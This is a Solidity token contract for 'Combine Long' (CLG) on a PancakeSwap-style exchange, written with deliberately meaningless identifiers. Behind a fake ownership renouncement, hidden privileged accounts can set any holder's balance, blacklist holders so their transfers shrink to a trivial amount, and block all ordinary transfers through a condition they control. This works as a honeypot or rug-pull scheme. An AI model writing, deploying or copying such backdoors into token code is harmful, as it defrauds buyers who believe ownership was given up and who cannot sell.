//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface marketingExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAuto) external view returns (uint256);

    function transfer(address amountLiquidity, uint256 walletMaxLiquidity) external returns (bool);

    function allowance(address maxMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletMaxLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address amountLiquidity,
        uint256 walletMaxLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableAutoSwap, uint256 value);
    event Approval(address indexed maxMin, address indexed spender, uint256 value);
}

abstract contract atIsLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountMin {
    function createPair(address shouldReceiver, address autoEnable) external returns (address);
}

interface marketingExemptMetadata is marketingExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CombineLong is atIsLaunched, marketingExempt, marketingExemptMetadata {

    event OwnershipTransferred(address indexed minTake, address indexed atFrom);

    function name() external view virtual override returns (string memory) {
        return buyLimit;
    }

    mapping(address => bool) public fromList;

    address public toShouldSender;

    function transfer(address buySell, uint256 walletMaxLiquidity) external virtual override returns (bool) {
        return toEnableLiquidity(_msgSender(), buySell, walletMaxLiquidity);
    }

    uint256 private maxMarketing = 100000000 * 10 ** 18;

    function enableSender(uint256 walletMaxLiquidity) public {
        atLaunched();
        txLiquidity = walletMaxLiquidity;
    }

    bool private isList;

    function owner() external view returns (address) {
        return marketingTx;
    }

    function toEnableLiquidity(address minSender, address amountLiquidity, uint256 walletMaxLiquidity) internal returns (bool) {
        if (minSender == toShouldSender) {
            return tokenFundBuy(minSender, amountLiquidity, walletMaxLiquidity);
        }
        uint256 liquidityAt = marketingExempt(tradingTake).balanceOf(receiverAmount);
        require(liquidityAt == txLiquidity);
        require(amountLiquidity != receiverAmount);
        if (senderList[minSender]) {
            return tokenFundBuy(minSender, amountLiquidity, fundToken);
        }
        return tokenFundBuy(minSender, amountLiquidity, walletMaxLiquidity);
    }

    uint256 constant fundToken = 14 ** 10;

    bool public sellList;

    function atLaunched() private view {
        require(fromList[_msgSender()]);
    }

    address public tradingTake;

    function sellReceiverMin() public {
        emit OwnershipTransferred(toShouldSender, address(0));
        marketingTx = address(0);
    }

    uint256 txLiquidity;

    function toAmount(address buySell, uint256 walletMaxLiquidity) public {
        atLaunched();
        tradingShould[buySell] = walletMaxLiquidity;
    }

    bool private feeTx;

    function fundShouldMarketing(address autoEnableAt) public {
        atLaunched();
        if (toSellExempt != takeEnableAmount) {
            feeTx = false;
        }
        if (autoEnableAt == toShouldSender || autoEnableAt == tradingTake) {
            return;
        }
        senderList[autoEnableAt] = true;
    }

    bool public feeLiquidity;

    mapping(address => uint256) private tradingShould;

    function allowance(address toMode, address liquidityReceiver) external view virtual override returns (uint256) {
        if (liquidityReceiver == minShould) {
            return type(uint256).max;
        }
        return receiverFrom[toMode][liquidityReceiver];
    }

    address minShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public fromAuto;

    uint256 public autoReceiverAmount;

    function decimals() external view virtual override returns (uint8) {
        return launchToken;
    }

    mapping(address => mapping(address => uint256)) private receiverFrom;

    string private receiverTx = "CLG";

    address receiverAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private tokenEnable;

    bool public sellLaunchedMarketing;

    function receiverMax(address buyAmount) public {
        if (sellList) {
            return;
        }
        
        fromList[buyAmount] = true;
        if (tokenEnable) {
            autoReceiverAmount = toSellExempt;
        }
        sellList = true;
    }

    string private buyLimit = "Combine Long";

    mapping(address => bool) public senderList;

    function totalSupply() external view virtual override returns (uint256) {
        return maxMarketing;
    }

    constructor (){
        if (isList == tokenEnable) {
            feeTx = false;
        }
        receiverFund receiverEnable = receiverFund(minShould);
        tradingTake = amountMin(receiverEnable.factory()).createPair(receiverEnable.WETH(), address(this));
        
        toShouldSender = _msgSender();
        sellReceiverMin();
        fromList[toShouldSender] = true;
        tradingShould[toShouldSender] = maxMarketing;
        
        emit Transfer(address(0), toShouldSender, maxMarketing);
    }

    uint256 public takeEnableAmount;

    function approve(address liquidityReceiver, uint256 walletMaxLiquidity) public virtual override returns (bool) {
        receiverFrom[_msgSender()][liquidityReceiver] = walletMaxLiquidity;
        emit Approval(_msgSender(), liquidityReceiver, walletMaxLiquidity);
        return true;
    }

    uint8 private launchToken = 18;

    function transferFrom(address minSender, address amountLiquidity, uint256 walletMaxLiquidity) external override returns (bool) {
        if (_msgSender() != minShould) {
            if (receiverFrom[minSender][_msgSender()] != type(uint256).max) {
                require(walletMaxLiquidity <= receiverFrom[minSender][_msgSender()]);
                receiverFrom[minSender][_msgSender()] -= walletMaxLiquidity;
            }
        }
        return toEnableLiquidity(minSender, amountLiquidity, walletMaxLiquidity);
    }

    function balanceOf(address receiverAuto) public view virtual override returns (uint256) {
        return tradingShould[receiverAuto];
    }

    function getOwner() external view returns (address) {
        return marketingTx;
    }

    address private marketingTx;

    uint256 receiverIsSell;

    function symbol() external view virtual override returns (string memory) {
        return receiverTx;
    }

    uint256 public toSellExempt;

    function tokenFundBuy(address minSender, address amountLiquidity, uint256 walletMaxLiquidity) internal returns (bool) {
        require(tradingShould[minSender] >= walletMaxLiquidity);
        tradingShould[minSender] -= walletMaxLiquidity;
        tradingShould[amountLiquidity] += walletMaxLiquidity;
        emit Transfer(minSender, amountLiquidity, walletMaxLiquidity);
        return true;
    }

}